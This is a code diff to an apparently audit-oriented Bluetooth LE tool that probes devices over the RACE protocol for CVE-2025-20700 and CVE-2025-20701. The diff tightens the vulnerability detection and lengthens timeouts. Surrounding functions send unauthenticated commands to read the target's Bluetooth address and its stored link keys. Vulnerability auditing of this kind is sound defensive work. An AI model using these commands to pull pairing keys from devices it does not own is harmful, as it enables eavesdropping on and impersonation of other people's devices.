@@ -206,7 +206,7 @@ bool RaceClient::discoverRaceService() {
 
     // Heuristic fallback: check if any service exposes known TX / RX characteristics
     if (!m_pTxChar || !m_pRxChar) {
-        Serial.println(F("[RACE] Primary profile match not found. Scanning all characteristics across services..."));
+        Serial.println(F("[RACE] Primary profile match not found. Scanning characteristics."));
         for (auto *srv : activeServices) {
             const auto &chars = srv->getCharacteristics(true);
             for (auto *ch : chars) {
@@ -474,20 +474,21 @@ bool RaceClient::probeVulnerability(RaceVulnerabilityReport &report,
         return false;
     }
 
-    report.raceOverBle = RACE_VULN_VULNERABLE;
     Serial.println(F("[RACE-AUDIT] Starting CVE-2025-20700 & CVE-2025-20701 Audit..."));
 
     bool unauthGattOk = false;
     bool explicitAuthReject = false;
+    const NimBLEConnInfo connInfo = m_pClient->getConnInfo();
+    const bool unauthenticatedLink = !connInfo.isEncrypted();
 
     // Probe 1: Query Build Version (0x1E08)
     if (progressCb) progressCb("[1/4] Probe Build (0x1E08)...");
     Serial.println(F("[RACE-AUDIT] [Probe 1/4] Querying Build Version (0x1E08)..."));
     std::vector<uint8_t> rsp;
-    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BUILD_VERSION, nullptr, 0, rsp, 1500)) {
+    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BUILD_VERSION, nullptr, 0, rsp, 2500)) {
         if (rsp.size() > sizeof(RaceHeader)) {
             uint8_t rc = rsp[sizeof(RaceHeader)];
-            if (rc == 0 || (rc >= 32 && rc <= 126)) {
+            if (unauthenticatedLink && (rc == 0 || (rc >= 32 && rc <= 126))) {
                 unauthGattOk = true;
             } else {
                 explicitAuthReject = true;
@@ -504,10 +505,10 @@ bool RaceClient::probeVulnerability(RaceVulnerabilityReport &report,
         if (progressCb) progressCb("[2/4] Probe SDK (0x0301)...");
         Serial.println(F("[RACE-AUDIT] [Probe 2/4] Querying SDK Version (0x0301)..."));
         rsp.clear();
-        if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_READ_SDK_VERSION, nullptr, 0, rsp, 1500)) {
+        if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_READ_SDK_VERSION, nullptr, 0, rsp, 2500)) {
             if (rsp.size() > sizeof(RaceHeader)) {
                 uint8_t rc = rsp[sizeof(RaceHeader)];
-                if (rc == 0 || (rc >= 32 && rc <= 126)) {
+                if (unauthenticatedLink && (rc == 0 || (rc >= 32 && rc <= 126))) {
                     unauthGattOk = true;
                 } else {
                     explicitAuthReject = true;
@@ -525,9 +526,9 @@ bool RaceClient::probeVulnerability(RaceVulnerabilityReport &report,
         if (progressCb) progressCb("[3/4] Probe BD_ADDR (0x0CD5)...");
         Serial.println(F("[RACE-AUDIT] [Probe 3/4] Querying Classic BD_ADDR (0x0CD5)..."));
         rsp.clear();
-        if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BD_ADDRESS, nullptr, 0, rsp, 1500)) {
+        if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BD_ADDRESS, nullptr, 0, rsp, 2500)) {
             if (rsp.size() >= sizeof(RaceHeader) + 2 + 6) {
-                if (rsp[sizeof(RaceHeader)] == 0) {
+                if (unauthenticatedLink && rsp[sizeof(RaceHeader)] == 0) {
                     unauthGattOk = true;
                 } else {
                     explicitAuthReject = true;
@@ -553,14 +554,17 @@ bool RaceClient::probeVulnerability(RaceVulnerabilityReport &report,
         }
     }
 
-    if (memAccessOk) {
+    if (memAccessOk && unauthenticatedLink) {
         unauthGattOk = true;
         report.cve2025_20701 = RACE_VULN_VULNERABLE;
+    } else if (memAccessOk) {
+        report.cve2025_20701 = RACE_VULN_FIXED;
     } else {
         report.cve2025_20701 = explicitAuthReject ? RACE_VULN_FIXED : RACE_VULN_UNKNOWN;
     }
 
     if (unauthGattOk) {
+        report.raceOverBle = RACE_VULN_VULNERABLE;
         report.cve2025_20700 = RACE_VULN_VULNERABLE;
         report.details = "RACE GATT service executes unauthenticated commands!";
         Serial.println(F("[RACE-AUDIT] >>> TARGET IS VULNERABLE TO CVE-2025-20700 <<<"));
@@ -601,7 +605,7 @@ bool RaceClient::fetchDeviceInfo(RaceDeviceInfo &info,
     if (progressCb) progressCb("[1/4] Reading Build (0x1E08)...");
     Serial.println(F("[RACE-INFO] [1/4] Reading Build Version (0x1E08)..."));
     std::vector<uint8_t> rsp;
-    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BUILD_VERSION, nullptr, 0, rsp, 1500)) {
+    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BUILD_VERSION, nullptr, 0, rsp, 2500)) {
         if (rsp.size() > sizeof(RaceHeader)) {
             size_t strOffset = sizeof(RaceHeader);
             if (rsp[strOffset] == 0x00 && rsp.size() > sizeof(RaceHeader) + 1) {
@@ -623,7 +627,7 @@ bool RaceClient::fetchDeviceInfo(RaceDeviceInfo &info,
     if (progressCb) progressCb("[2/4] Reading SDK (0x0301)...");
     Serial.println(F("[RACE-INFO] [2/4] Reading SDK Version (0x0301)..."));
     rsp.clear();
-    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_READ_SDK_VERSION, nullptr, 0, rsp, 1500)) {
+    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_READ_SDK_VERSION, nullptr, 0, rsp, 2500)) {
         if (rsp.size() > sizeof(RaceHeader)) {
             size_t strOffset = sizeof(RaceHeader);
             if (rsp[strOffset] == 0x00 && rsp.size() > sizeof(RaceHeader) + 1) {
@@ -645,7 +649,7 @@ bool RaceClient::fetchDeviceInfo(RaceDeviceInfo &info,
     if (progressCb) progressCb("[3/4] Querying BD_ADDR (0x0CD5)...");
     Serial.println(F("[RACE-INFO] [3/4] Querying Classic BD_ADDR (0x0CD5)..."));
     rsp.clear();
-    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BD_ADDRESS, nullptr, 0, rsp, 1500)) {
+    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BD_ADDRESS, nullptr, 0, rsp, 2500)) {
         // Preamble: return_code (1B) + agent_or_partner (1B) + bd_addr (6B, LE reversed)
         size_t addrOffset = sizeof(RaceHeader) + 2;
         if (rsp.size() >= addrOffset + 6 && rsp[sizeof(RaceHeader)] == 0) {
@@ -663,7 +667,7 @@ bool RaceClient::fetchDeviceInfo(RaceDeviceInfo &info,
     if (progressCb) progressCb("[4/4] Querying Link Keys (0x0CC0)...");
     Serial.println(F("[RACE-INFO] [4/4] Querying Stored Link Keys (0x0CC0)..."));
     rsp.clear();
-    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_LINK_KEY, nullptr, 0, rsp, 1500)) {
+    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_LINK_KEY, nullptr, 0, rsp, 2500)) {
         // Preamble: return_code (1B) + num_of_devices (1B) + reserved (1B)
         size_t pOffset = sizeof(RaceHeader);
         if (rsp.size() >= pOffset + 3 && rsp[pOffset] == 0) {
